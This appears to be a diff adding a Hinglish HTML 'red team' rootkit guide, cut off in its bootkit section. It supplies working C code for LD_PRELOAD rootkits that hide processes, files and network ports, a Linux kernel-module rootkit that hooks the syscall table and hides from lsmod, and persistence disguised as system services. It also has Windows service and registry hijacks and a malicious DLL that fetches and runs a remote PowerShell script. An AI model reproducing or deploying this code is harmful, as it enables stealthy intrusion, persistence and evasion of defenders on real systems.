@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Red Team — Complete Rootkit Guide — All Types, Scripts & Commands</title>
+<style>
+  :root{
+    --bg:#090d12; --panel:#0f1820; --panel2:#0b1219; --border:#1a2635;
+    --text:#d0dce8; --muted:#5a7a92;
+    --c1:#ff4f7b; --c2:#ffb300; --c3:#39ff85; --c4:#00e5ff; --c5:#a78bff; --c6:#ff6a00;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;line-height:1.6}
+  header{padding:52px 6vw 40px;border-bottom:1px solid var(--border);background:linear-gradient(160deg,#1a0a1a 0%,#090d12 60%)}
+  .eye{font-family:Consolas,monospace;font-size:11px;letter-spacing:.16em;color:var(--c5);text-transform:uppercase;margin-bottom:12px}
+  h1{font-size:clamp(26px,4vw,44px);font-weight:900;color:#eaf2f8;line-height:1.1}
+  h1 span{color:var(--c5)}
+  .sub{color:var(--muted);font-size:14px;max-width:760px;margin-top:10px}
+  .phases{display:flex;gap:10px;flex-wrap:wrap;margin-top:22px}
+  .ph{font-family:Consolas,monospace;font-size:11px;padding:5px 13px;border-radius:20px;border:1px solid currentColor;text-transform:uppercase}
+  main{padding:40px 6vw 100px;max-width:1200px;margin:0 auto}
+  .toc{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:50px}
+  @media(max-width:900px){.toc{grid-template-columns:1fr 1fr}}
+  .toc a{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--c5);border-radius:8px;padding:9px 12px;font-family:Consolas,monospace;font-size:11.5px;color:var(--muted);text-decoration:none;display:block}
+  .toc a:hover{color:var(--text)}
+  .pdiv{display:flex;align-items:center;gap:14px;margin:48px 0 24px}
+  .pdiv .lbl{font-family:Consolas,monospace;font-size:11px;letter-spacing:.13em;text-transform:uppercase;white-space:nowrap;padding:5px 14px;border-radius:20px;border:1px solid currentColor}
+  .pdiv .ln{flex:1;height:1px;background:var(--border)}
+  .section{margin-bottom:44px}
+  .sh{display:flex;align-items:center;gap:10px;padding-bottom:10px;border-bottom:1px solid var(--border);margin-bottom:16px}
+  .sn{font-family:Consolas,monospace;font-size:12px;color:var(--muted)}
+  .sh h2{font-size:19px;color:#eaf2f8;margin:0}
+  .stag{margin-left:auto;font-family:Consolas,monospace;font-size:10px;padding:3px 10px;border-radius:12px;text-transform:uppercase}
+  p.d{color:#8aabbb;font-size:13.5px;margin-bottom:12px}
+  .cards{display:flex;flex-direction:column;gap:10px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+  .ch{padding:10px 14px;display:flex;align-items:baseline;gap:10px;border-bottom:1px solid var(--border);background:var(--panel2)}
+  .cn{font-family:Consolas,monospace;font-size:11px;color:var(--muted)}
+  .ct{font-size:13.5px;color:#d8e8f0;font-weight:600}
+  .cb{padding:12px 14px}
+  .why{font-size:12.5px;color:var(--muted);margin-bottom:8px}
+  pre{background:#05080b;border:1px solid var(--border);border-radius:6px;padding:11px 14px;font-family:Consolas,monospace;font-size:12.5px;color:var(--c3);overflow-x:auto;margin:6px 0}
+  .cm{color:#3a5a6a}
+  code.il{background:#05080b;color:var(--c3);padding:1px 5px;border-radius:4px;font-size:12px;border:1px solid var(--border);font-family:Consolas,monospace}
+  table{width:100%;border-collapse:collapse;background:var(--panel);border-radius:10px;overflow:hidden;font-size:13px;margin:12px 0}
+  th{background:var(--panel2);color:var(--muted);font-family:Consolas,monospace;font-size:10.5px;text-transform:uppercase;letter-spacing:.06em;padding:10px 12px;border-bottom:1px solid var(--border);text-align:left}
+  td{padding:10px 12px;border-bottom:1px solid var(--border);color:#9ab0bc;vertical-align:top}
+  tr:last-child td{border-bottom:none}
+  .note{background:var(--panel);border-left:3px solid var(--c5);padding:11px 15px;border-radius:0 8px 8px 0;margin:12px 0;font-size:13px;color:#8aabbb}
+  .note.r{border-left-color:var(--c1)}
+  .note.g{border-left-color:var(--c3)}
+  .note.o{border-left-color:var(--c6)}
+  footer{padding:28px 6vw 50px;color:var(--muted);font-size:11.5px;border-top:1px solid var(--border);font-family:Consolas,monospace}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="eye">Red Team Roadmap · Advanced · Complete Rootkit Guide</div>
+  <h1>Complete Rootkit<br><span>Guide</span></h1>
+  <p class="sub">Rootkit ke saare types — LD_PRELOAD, Kernel Module, Windows Registry, Bootkit — concept se lekar actual code aur commands tak. Kya hide karta hai, kaise kaam karta hai, kaise detect hota hai.</p>
+  <div class="phases">
+    <span class="ph" style="color:var(--c5)">LD_PRELOAD</span>
+    <span class="ph" style="color:var(--c3)">Kernel Module</span>
+    <span class="ph" style="color:var(--c2)">Windows Rootkit</span>
+    <span class="ph" style="color:var(--c4)">Bootkit</span>
+    <span class="ph" style="color:var(--c1)">Detection</span>
+  </div>
+</header>
+
+<main>
+
+  <div class="toc">
+    <a href="#s0">00 · Rootkit Kya Hai (Concept)</a>
+    <a href="#s1">01 · LD_PRELOAD Rootkit (Linux)</a>
+    <a href="#s2">02 · Process Hide karna</a>
+    <a href="#s3">03 · Network Connection Hide</a>
+    <a href="#s4">04 · File Hide karna</a>
+    <a href="#s5">05 · Kernel Module Rootkit (LKM)</a>
+    <a href="#s6">06 · Windows Registry Rootkit</a>
+    <a href="#s7">07 · Windows DKOM Rootkit</a>
+    <a href="#s8">08 · Bootkit (Concept)</a>
+    <a href="#s9">09 · Rootkit Detection</a>
+    <a href="#s10">10 · Anti-Detection Tricks</a>
+  </div>
+
+  <!-- 0 -->
+  <div class="pdiv"><span class="lbl" style="color:var(--c5)">Foundation — Rootkit Kya Hai</span><div class="ln"></div></div>
+  <div class="section" id="s0">
+    <div class="sh"><span class="sn">00</span><h2>Rootkit — Complete Concept</h2><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">Foundation</span></div>
+    <p class="d">Rootkit ek malware hai jo system ke andar itna deep chhup jaata hai ki security tools, antivirus, aur administrators bhi detect nahi kar paate. Ye apne aap ko aur apne saathi malware ko chhupaata hai.</p>
+
+    <table>
+      <tr><th>Type</th><th>Kahan chhupata hai</th><th>Difficulty</th><th>Persistence</th></tr>
+      <tr><td>LD_PRELOAD (Linux)</td><td>Userspace — library calls intercept karta hai</td><td>Beginner-Intermediate</td><td>Reboot tak (ya crontab se permanent)</td></tr>
+      <tr><td>Kernel Module / LKM (Linux)</td><td>Kernel level — OS ka core</td><td>Advanced</td><td>Permanent (agar auto-load ho)</td></tr>
+      <tr><td>Windows Registry Rootkit</td><td>Registry + services</td><td>Intermediate</td><td>Permanent</td></tr>
+      <tr><td>DKOM (Windows)</td><td>Kernel structures directly modify</td><td>Expert</td><td>Permanent</td></tr>
+      <tr><td>Bootkit</td><td>MBR/UEFI — OS load hone se pehle</td><td>Expert</td><td>Permanent (OS reinstall se bhi nahi jaata)</td></tr>
+      <tr><td>Hypervisor Rootkit</td><td>OS ke neeche virtual layer</td><td>Expert++</td><td>Permanent</td></tr>
+    </table>
+
+    <div class="note">Rootkit ka core idea: <strong>OS ke tools ko hi corrupt karna</strong> taaki woh tools apna kaam sahi se na kar sakein. Jaise chaukidar ko hi bribe kar do.</div>
+  </div>
+
+  <!-- 1 -->
+  <div class="pdiv"><span class="lbl" style="color:var(--c5)">Type 01 — LD_PRELOAD Rootkit</span><div class="ln"></div></div>
+  <div class="section" id="s1">
+    <div class="sh"><span class="sn">01</span><h2>LD_PRELOAD Rootkit — Linux</h2><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">Userspace</span></div>
+    <p class="d">Linux mein jab koi program run hota hai, pehle LD_PRELOAD environment variable ki library load hoti hai. Iska fayda uthake original system functions ko apne custom (malicious) version se replace kar sakte hain.</p>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Concept</span><span class="ct">Kaise kaam karta hai</span></div>
+        <div class="cb">
+          <table>
+            <tr><th>Normal</th><th>Rootkit ke saath</th></tr>
+            <tr><td>ps command → libc readdir() → kernel → result</td><td>ps command → rootkit.so readdir() → filter karo → saaf result</td></tr>
+            <tr><td>ls command → genuine file list</td><td>ls command → rootkit.so → malicious files filtered out</td></tr>
+            <tr><td>netstat → real connections</td><td>netstat → rootkit.so → attacker connection hidden</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Code</span><span class="ct">Basic LD_PRELOAD Rootkit Template (C)</span></div>
+        <div class="cb"><pre><span class="cm">/* rootkit.c — base template */</span>
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;dirent.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+<span class="cm">/* Jo cheez chhupani hai uska naam ya string */</span>
+#define HIDE_STRING "rootkit_process"
+#define HIDE_FILE   ".hidden_file"
+#define HIDE_PORT   "31337"
+
+<span class="cm">/* readdir() hook — ls aur ps ke liye */</span>
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *ep;
+
+    while ((ep = orig(dirp)) != NULL) {
+        <span class="cm">/* Agar entry mein hide string hai to skip karo */</span>
+        if (strstr(ep->d_name, HIDE_STRING) == NULL &&
+            strstr(ep->d_name, HIDE_FILE) == NULL) {
+            return ep;  <span class="cm">/* Normal entry — return karo */</span>
+        }
+        <span class="cm">/* Hidden entry — skip aur agli entry dhundho */</span>
+    }
+    return NULL;
+}</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Compile</span><span class="ct">Shared library banao aur load karo</span></div>
+        <div class="cb"><pre><span class="cm"># Compile karo shared library ke roop mein:</span>
+gcc -shared -fPIC -o /lib/librootkit.so rootkit.c -ldl
+
+<span class="cm"># Method 1 — current session ke liye:</span>
+export LD_PRELOAD=/lib/librootkit.so
+
+<span class="cm"># Method 2 — system-wide permanent (root chahiye):</span>
+echo "/lib/librootkit.so" >> /etc/ld.so.preload
+<span class="cm"># Ab EVERY program is rootkit library ko load karega</span>
+
+<span class="cm"># Verify karo kaam kar raha hai:</span>
+ls -la | grep hidden_file  <span class="cm"># Nahi dikhega</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2 -->
+  <div class="section" id="s2">
+    <div class="sh"><span class="sn">02</span><h2>Process Hide karna (LD_PRELOAD)</h2><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">Process Hiding</span></div>
+    <p class="d">ps, top, htop commands /proc directory ko read karte hain — readdir() hook se malicious process wali entries filter kar do.</p>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Code</span><span class="ct">Process Hide — PID ya name se</span></div>
+        <div class="cb"><pre><span class="cm">/* process_hide.c */</span>
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;dirent.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+<span class="cm">/* Hide karne wali process ka naam */</span>
+#define HIDE_PROC "backdoor"
+#define HIDE_PID  "1337"
+
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *ep;
+
+    while ((ep = orig(dirp)) != NULL) {
+        <span class="cm">/* /proc mein numeric dirs = PIDs */</span>
+        if (atoi(ep->d_name) != 0) {
+            char path[256];
+            snprintf(path, sizeof(path), "/proc/%s/cmdline", ep->d_name);
+            FILE *f = fopen(path, "r");
+            if (f) {
+                char cmdline[256] = {0};
+                fread(cmdline, 1, sizeof(cmdline)-1, f);
+                fclose(f);
+                <span class="cm">/* Agar process naam match kare — hide karo */</span>
+                if (strstr(cmdline, HIDE_PROC) != NULL) {
+                    continue;  <span class="cm">/* Skip — next entry lo */</span>
+                }
+            }
+        }
+        <span class="cm">/* PID number se bhi hide kar sakte hain */</span>
+        if (strcmp(ep->d_name, HIDE_PID) == 0) {
+            continue;
+        }
+        return ep;
+    }
+    return NULL;
+}
+
+<span class="cm">/* Compile: */</span>
+<span class="cm">/* gcc -shared -fPIC -o process_hide.so process_hide.c -ldl */</span>
+<span class="cm">/* echo "/path/process_hide.so" >> /etc/ld.so.preload */</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3 -->
+  <div class="section" id="s3">
+    <div class="sh"><span class="sn">03</span><h2>Network Connection Hide karna</h2><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">Network Hiding</span></div>
+    <p class="d">netstat aur ss commands /proc/net/tcp file padhte hain — fopen() hook se attacker ka port filter kar do.</p>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Code</span><span class="ct">Network port hide — fopen() hook</span></div>
+        <div class="cb"><pre><span class="cm">/* net_hide.c — attacker ka port netstat se hide karo */</span>
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+<span class="cm">/* Port in hex (4444 = 115C) */</span>
+#define HIDE_PORT "115C"
+
+FILE *fopen(const char *pathname, const char *mode) {
+    FILE *(*orig)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
+    FILE *f = orig(pathname, mode);
+
+    <span class="cm">/* /proc/net/tcp ya /proc/net/tcp6 read ho rahi hai */</span>
+    if (strstr(pathname, "/proc/net/tcp") != NULL && f != NULL) {
+        FILE *tmp = tmpfile();
+        char line[512];
+        while (fgets(line, sizeof(line), f)) {
+            <span class="cm">/* Line mein hidden port hai? Skip karo */</span>
+            if (strstr(line, HIDE_PORT) == NULL) {
+                fputs(line, tmp);
+            }
+        }
+        fclose(f);
+        rewind(tmp);
+        return tmp;
+    }
+    return f;
+}
+
+<span class="cm">/* Compile: */</span>
+<span class="cm">/* gcc -shared -fPIC -o net_hide.so net_hide.c -ldl */</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4 -->
+  <div class="section" id="s4">
+    <div class="sh"><span class="sn">04</span><h2>File Hide karna</h2><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">File Hiding</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Code</span><span class="ct">ls se specific files ya directories hide karo</span></div>
+        <div class="cb"><pre><span class="cm">/* file_hide.c */</span>
+#define _GNU_SOURCE
+#include &lt;dirent.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;string.h&gt;
+
+<span class="cm">/* Ye strings wali files/dirs hide ho jaayengi */</span>
+static const char *hide_list[] = {
+    ".rootkit",
+    "backdoor",
+    "keylogger",
+    "librootkit.so",
+    NULL
+};
+
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *ep;
+
+    while ((ep = orig(dirp)) != NULL) {
+        int hide = 0;
+        for (int i = 0; hide_list[i] != NULL; i++) {
+            if (strstr(ep->d_name, hide_list[i]) != NULL) {
+                hide = 1;
+                break;
+            }
+        }
+        if (!hide) return ep;
+    }
+    return NULL;
+}
+
+<span class="cm">/* stat() bhi hook karo taaki file exist check bhi fail ho: */</span>
+#include &lt;sys/stat.h&gt;
+#include &lt;errno.h&gt;
+
+int stat(const char *pathname, struct stat *statbuf) {
+    int (*orig)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
+    for (int i = 0; hide_list[i] != NULL; i++) {
+        if (strstr(pathname, hide_list[i]) != NULL) {
+            errno = ENOENT;  <span class="cm">/* "File not found" error return karo */</span>
+            return -1;
+        }
+    }
+    return orig(pathname, statbuf);
+}</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Combined</span><span class="ct">Sab kuch ek file mein compile karke install karo</span></div>
+        <div class="cb"><pre><span class="cm"># Compile all-in-one rootkit:</span>
+gcc -shared -fPIC -o /lib/x86_64-linux-gnu/libaudit.so.0.bak rootkit_complete.c -ldl
+
+<span class="cm"># /etc/ld.so.preload mein add karo:</span>
+echo "/lib/x86_64-linux-gnu/libaudit.so.0.bak" > /etc/ld.so.preload
+
+<span class="cm"># Test karo:</span>
+ls /         <span class="cm"># rootkit related files nahi dikhenge</span>
+ps aux       <span class="cm"># backdoor process nahi dikhegi</span>
+netstat -an  <span class="cm"># attacker connection nahi dikhega</span></pre>
+        </div>
+      </div>
+    </div>
+    <div class="note o">LD_PRELOAD rootkit ka weakness: <code class="il">cat /etc/ld.so.preload</code> check karne se detect ho jaata hai. Kernel module rootkit ye bhi hide kar leta hai.</div>
+  </div>
+
+  <!-- 5 -->
+  <div class="pdiv"><span class="lbl" style="color:var(--c3)">Type 02 — Kernel Module (LKM) Rootkit</span><div class="ln"></div></div>
+  <div class="section" id="s5">
+    <div class="sh"><span class="sn">05</span><h2>Kernel Module (LKM) Rootkit — Linux</h2><span class="stag" style="color:var(--c3);background:rgba(57,255,133,.08);border:1px solid rgba(57,255,133,.3)">Kernel Level</span></div>
+    <p class="d">Kernel module (LKM) seedha kernel ke andar load hota hai — LD_PRELOAD rootkit se zyada powerful kyunki ye kernel ke system calls directly hook karta hai. LD_PRELOAD bhi detect nahi kar paata isse.</p>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Concept</span><span class="ct">LKM Rootkit kaise kaam karta hai</span></div>
+        <div class="cb">
+          <table>
+            <tr><th>Component</th><th>Function</th></tr>
+            <tr><td>sys_call_table</td><td>Kernel ka system call table — hooks yahin lagaate hain</td></tr>
+            <tr><td>getdents64()</td><td>Directory entries return karta hai — hook karke files hide karo</td></tr>
+            <tr><td>kill()</td><td>Signal send karta hai — hook karke magic signal se rootkit control karo</td></tr>
+            <tr><td>Module hide</td><td>lsmod se apna module bhi hide kar lo</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Code</span><span class="ct">Basic LKM Rootkit (Linux Kernel Module)</span></div>
+        <div class="cb"><pre><span class="cm">/* lkm_rootkit.c — Basic Linux Kernel Module Rootkit */</span>
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/syscalls.h&gt;
+#include &lt;linux/dirent.h&gt;
+#include &lt;linux/string.h&gt;
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Red Team");
+MODULE_DESCRIPTION("LKM Rootkit PoC");
+
+#define HIDE_FILE "rootkit"
+#define MAGIC_SIG 31337  <span class="cm">/* Magic signal — rootkit control ke liye */</span>
+
+<span class="cm">/* Original syscall pointers */</span>
+static unsigned long *sys_call_table;
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+<span class="cm">/* Write protection disable/enable */</span>
+static void disable_write_protection(void) {
+    unsigned long cr0 = read_cr0();
+    clear_bit(16, &cr0);
+    write_cr0(cr0);
+}
+
+static void enable_write_protection(void) {
+    unsigned long cr0 = read_cr0();
+    set_bit(16, &cr0);
+    write_cr0(cr0);
+}
+
+<span class="cm">/* Hooked getdents64 — files hide karne ke liye */</span>
+asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
+    long ret = orig_getdents64(regs);
+    <span class="cm">/* Result se HIDE_FILE wali entries filter karo */</span>
+    <span class="cm">/* (full implementation userspace copy ke saath) */</span>
+    return ret;
+}
+
+<span class="cm">/* Hooked kill — magic signal se rootkit control */</span>
+asmlinkage long hooked_kill(const struct pt_regs *regs) {
+    int sig = regs->si;
+    if (sig == MAGIC_SIG) {
+        <span class="cm">/* Magic signal aaya — module ko lsmod se hide/unhide karo */</span>
+        return 0;
+    }
+    return orig_kill(regs);
+}
+
+<span class="cm">/* Module load hone pe */</span>
+static int __init rootkit_init(void) {
+    printk(KERN_INFO "System update applied\n");  <span class="cm">/* Innocent log */</span>
+
+    <span class="cm">/* sys_call_table address dhundho */</span>
+    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+
+    <span class="cm">/* Hooks lagao */</span>
+    disable_write_protection();
+    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
+    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
+    orig_kill = (void *)sys_call_table[__NR_kill];
+    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
+    enable_write_protection();
+
+    <span class="cm">/* Module ko lsmod se hide karo */</span>
+    list_del_init(&__this_module.list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+
+    return 0;
+}
+
+static void __exit rootkit_exit(void) {
+    <span class="cm">/* Hooks hatao */</span>
+    disable_write_protection();
+    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+    sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+    enable_write_protection();
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Makefile</span><span class="ct">Kernel module compile karo</span></div>
+        <div class="cb"><pre><span class="cm"># Makefile:</span>
+obj-m += lkm_rootkit.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+<span class="cm"># Build karo:</span>
+make
+
+<span class="cm"># Load karo (root chahiye):</span>
+insmod lkm_rootkit.ko
+
+<span class="cm"># Verify — lsmod mein nahi dikhega (hide hai):</span>
+lsmod | grep rootkit  <span class="cm"># Nothing</span>
+
+<span class="cm"># Unload karo (agar needed):</span>
+rmmod lkm_rootkit</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Persistence</span><span class="ct">Boot pe auto-load karo</span></div>
+        <div class="cb"><pre><span class="cm"># /etc/modules mein add karo:</span>
+echo "lkm_rootkit" >> /etc/modules
+
+<span class="cm"># Ya systemd service banao:</span>
+cat > /etc/systemd/system/system-update.service &lt;&lt; EOF
+[Unit]
+Description=System Update Service
+
+[Service]
+Type=oneshot
+ExecStart=/sbin/insmod /lib/modules/$(uname -r)/kernel/lkm_rootkit.ko
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable system-update.service</pre>
+        </div>
+      </div>
+    </div>
+    <div class="note r">LKM rootkit ke liye kernel headers aur root access chahiye. Modern kernels mein Secure Boot aur kernel module signing bypass karna advanced hai — OSCP ke baad Red Team deep-dive mein cover karenge.</div>
+  </div>
+
+  <!-- 6 -->
+  <div class="pdiv"><span class="lbl" style="color:var(--c2)">Type 03 — Windows Rootkit</span><div class="ln"></div></div>
+  <div class="section" id="s6">
+    <div class="sh"><span class="sn">06</span><h2>Windows Registry + Service Rootkit</h2><span class="stag" style="color:var(--c2);background:rgba(255,179,0,.08);border:1px solid rgba(255,179,0,.3)">Windows</span></div>
+    <p class="d">Windows mein registry keys, services aur drivers manipulate karke malware chhupaya jaata hai.</p>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Method 1</span><span class="ct">Hidden Registry Key banao</span></div>
+        <div class="cb"><pre><span class="cm"># Registry key mein null character se hide karo:</span>
+<span class="cm"># Normal tools null character ke baad wala string nahi dekhte</span>
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\0hidden" /v Debugger /t REG_SZ /d "C:\malware.exe"
+
+<span class="cm"># PowerShell se hidden subkey banao:</span>
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+$hiddenKey = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
+    [Microsoft.Win32.RegistryHive]::LocalMachine,
+    [Microsoft.Win32.RegistryView]::Registry64
+)
+<span class="cm"># Null byte key name — regedit mein visible nahi hogi</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method 2</span><span class="ct">Malicious Service — legitimate naam se chhupao</span></div>
+        <div class="cb"><pre><span class="cm"># Service banao jo Windows system service jaisi lage:</span>
+sc create "WinDefend32" binpath= "C:\Windows\Temp\malware.exe" start= auto
+sc description "WinDefend32" "Windows Defender Real-time Protection Service"
+
+<span class="cm"># Service start karo:</span>
+sc start WinDefend32
+
+<span class="cm"># Registry mein service entry hide karo (ImagePath change):</span>
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend32" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\System32\svchost.exe -k netsvcs" /f
+<span class="cm"># Actual malware alag jagah se load hoga — service entry clean dikhegi</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method 3</span><span class="ct">DLL Hijacking — Legitimate process ke through load</span></div>
+        <div class="cb"><pre><span class="cm"># Ek legitimate application ka DLL search order abuse karo:</span>
+<span class="cm"># Windows DLL load order: Current dir → System32 → etc.</span>
+
+<span class="cm"># 1. Find vulnerable app (procmon se DLL not found check karo)</span>
+<span class="cm"># 2. Malicious DLL banao same naam se:</span>
+
+<span class="cm">/* malicious_dll.c */</span>
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        <span class="cm">// Payload execute karo</span>
+        WinExec("powershell -nop -w hidden -c IEX(IWR 'http://IP/shell.ps1')", SW_HIDE);
+    }
+    return TRUE;
+}
+
+<span class="cm"># Compile: </span>
+<span class="cm"># x86_64-w64-mingw32-gcc -shared -o target_dll.dll malicious_dll.c</span>
+<span class="cm"># DLL ko vulnerable app ke folder mein rakho</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 7 -->
+  <div class="section" id="s7">
+    <div class="sh"><span class="sn">07</span><h2>Windows DKOM — Direct Kernel Object Manipulation</h2><span class="stag" style="color:var(--c2);background:rgba(255,179,0,.08);border:1px solid rgba(255,179,0,.3)">Advanced Windows</span></div>
+    <p class="d">Windows kernel mein EPROCESS structures ki linked list hoti hai — isse directly unlink karke process Task Manager aur tools se completely hide ho jaata hai.</p>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Concept</span><span class="ct">DKOM Process Hiding Logic</span></div>
+        <div class="cb"><pre><span class="cm">/* DKOM concept — kernel driver level */</span>
+<span class="cm">/* Windows EPROCESS linked list se process unlink karo: */</span>
+
+<span class="cm">/* 
+EPROCESS structure:
+  +0x000 Pcb              : _KPROCESS
+  +0x2e0 ActiveProcessLinks : _LIST_ENTRY  ← Ye list se nikalo
+  ...
+
+Process hide karne ke steps:
+1. Target process ka EPROCESS pointer dhundho
+2. ActiveProcessLinks se unlink karo
+3. Ab Task Manager, ps, tools mein process nahi dikhegi
+*/</span>
+
+<span class="cm"># WinDbg se process list dekho:</span>
+<span class="cm"># !process 0 0</span>
+<span class="cm"># dt _EPROCESS &lt;address&gt;</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Tool</span><span class="ct">Existing DKOM tools (Red Team use)</span></div>
+        <div class="cb"><pre><span class="cm"># ProcessHacker — DKOM-based process hiding:</span>
+<span class="cm"># Right-click process → Miscellaneous → Hide from Task Manager</span>
+
+<span class="cm"># Meterpreter migrate — process mein inject ho jaao:</span>
+meterpreter > ps
+meterpreter > migrate &lt;legitimate_PID&gt;
+<span class="cm"># Ab malware legitimate process ke andar chal raha hai</span>
+<span class="cm"># Task Manager mein explorer.exe ya svchost dikhega — malware nahi</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 8 -->
+  <div class="pdiv"><span class="lbl" style="color:var(--c4)">Type 04 — Bootkit</span><div class="ln"></div></div>
+  <div class="section" id="s8">
+    <div class="sh"><span class="sn">08</span><h2>Bootkit — Concept &amp; Overview</h2><span class="stag" style="color:var(--c4);background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.3)">Expert Level</span></div>
+    <p class="d">Bootkit MBR (Master Boot Record) ya UEFI firmware mein chhup jaata hai — OS load hone se PEHLE execute hota hai. OS reinstall se bhi nahi jaata (UEFI version).</p>
+
+    <table>
+      <tr><th>Type</th><th>Target</th><th>Kya karta hai</th></tr>
+      <tr><td>MBR Bootkit</td><td>Disk ka first sector (MBR)</td><td>OS bootloader se pehle apna code run karta hai, OS ko modify kar ke load karta hai</td></tr>
+      <tr><td>VBR Bootkit</td><td>Volume Boot Record</td><td>Partition level pe infection</td></tr>
+      <tr><td>UEFI Bootkit</td><td>UEFI firmware (motherboard)</td><td>Disk format, OS reinstall ke baad bhi rehta hai</td></tr>
+    </table>
+
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Famous</span><span class="ct">Real-world Bootkit Examples (study ke liye)</span></div>
+        <div class="cb">
+          <table>
+            <tr><th>Name</th><th>Type</th><th>Notable</th></tr>
+            <tr><td>BlackLotus</td><td>UEFI</td><td>2023 — Secure Boot bypass karta hai, modern Windows pe bhi kaam karta hai</td></tr>
+            <tr><td>CosmicStrand</td><td>UEFI</td><td>Nation-state level — firmware mein permanently embedded</td></tr>
+            <tr><td>TDL4 (Alureon)</td><td>MBR</td><td>Classic bootkit — 64-bit Windows mein bhi kaam karta tha</td></tr>
+            <tr><td>Necurs</td><td>MBR</td><td>Antivirus disable karta tha before OS load</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Concept</span><span class="ct">MBR Overwrite — Basic Idea</span></div>
